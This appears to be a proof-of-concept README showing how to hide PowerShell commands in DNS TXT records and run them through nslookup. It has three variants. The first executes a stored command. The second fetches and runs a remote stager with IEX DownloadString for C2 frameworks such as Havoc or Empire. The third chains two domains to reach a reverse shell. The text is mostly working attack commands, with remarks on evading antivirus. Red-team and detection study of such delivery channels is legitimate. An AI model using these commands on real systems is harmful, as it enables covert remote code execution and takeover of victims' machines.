### Variant 0.1
Commands are stored as TXT entries on a DNS server and requested via nslookup (a.k.a "nshookup").<br><br>
Client executing:.<br>
`powershell (nslookup -q=txt bad-domain.com)[5]`<br><br>
DNS Server TXT entry:<br>
`ping google.com`<br><br>
*EXPLANATION: nslookup.exe calls the TXT entry through DNS as subprocess from powershell. This way the stored commands get transmitted over DNS and executed in the context of the current (powershell) process. The number in the square brackets stands for the index (five being the first possible one) of the command. It is also possible to use "[-1]" should there be only a single command available as TXT entry.*<br><br>

The outcome is `powershell ping google.com` being executed in the current session on the clients system.

![GRAPHIC_1 1](https://github.com/Dood3/PoCs/assets/93183445/d550b7d7-db51-42da-9834-b89f5c792bfb)



### Variant 0.2
-> Commands are stored as TXT entries on a DNS server to host a payload/stager for a  reverse connection to a C2 server (Havoc, Empire, etc.).<br><br>
Client executing:<br>
`powershell (nslookup -q=txt bad-domain.com)[5]`<br><br>
DNS Server TXT entry:<br>
`IEX (New-Object Net.WebClient).DownloadString('http:/server/payload.html')`<br><br>
*EXPLANATION: Again, the TXT enty is interpreted as legitimate command through parent & child process being powershell and a DNS request respectively.
The file hosting the payload is not bound to any file formats. A simple file without suffix will work. 
This request will probably trigger AV (AMSI). If "IEX" doesn't get caught, the delivered payload itself most likely will.*<br>

![GRAPHIC_2 1](https://github.com/Dood3/PoCs/assets/93183445/3954f3ed-4196-497e-a369-14a5d71355d9)



### Variant 0.3
-> Commands are stored as TXT entries on a domain1.com to host another nslookup command requesting entries from domain2.com.<br><br>
Client executing:<br>
`powershell (nslookup -q=txt bad-domain.com)[5]`<br><br>
DNS Server TXT entry (the index may vary):<br>
`powershell (nslookup -q=txt bad-domain2.com)[5]`<br><br>
DNS Server TXT entry on bad-domain_2.com:<br>
`IEX (New-Object Net.WebClient).DownloadString('http:/server/payload.html')`<br><br>
*EXPLANATION: The commands can be chained together with a combination of dns servers. The client requests the first domain, which in return requests the actual commands on the second server.*<br>
This will most likely trigger AV (AMSI).<br>

1. `powershell (nslookup -q=txt bad-domain.com)[5]`<br>
2. `powershell (nslookup -q=txt bad-domain_2.com)[5]`<br>
3. `Command gets delivered to Client (over dns)`<br>
4. `Reverse shell phoning home`<br>

![GRAPHIC_3 1](https://github.com/Dood3/PoCs/assets/93183445/c8fe7f80-361c-4ccc-9249-8c345ce14351)

<br><br><br><br><br><br><br>


*Icons:*<br>
<font size="1">
https://www.flaticon.com/free-icons/computer  <br>
https://icons8.com/icon/set/firewall-png/glyph-neue <br>
https://icons8.com/icons/set/computer <br> 
</font>

